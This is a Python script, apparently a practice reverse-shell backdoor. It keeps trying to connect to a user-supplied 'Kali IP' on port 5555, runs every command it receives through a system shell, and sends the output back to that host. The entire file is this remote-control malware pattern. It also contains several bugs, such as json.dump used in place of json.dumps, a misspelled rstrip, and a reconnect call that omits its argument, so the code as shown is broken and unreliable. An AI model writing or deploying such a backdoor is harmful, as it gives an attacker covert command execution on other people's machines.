import socket
import time
import json
import subprocess

def reliable_send(data):
    jsondata = json.dump(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstip()
            return json.loads(data)
        except ValueError:
            continue

ip = str(input("Insert your Kali IP:\n"))

def connection(kali_ip):
    while True:
        time.sleep(20)
        try:
            s.connect((kali_ip, 5555))
            shell()
            s.close()
            break
        except:
            connection()
    
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection(ip)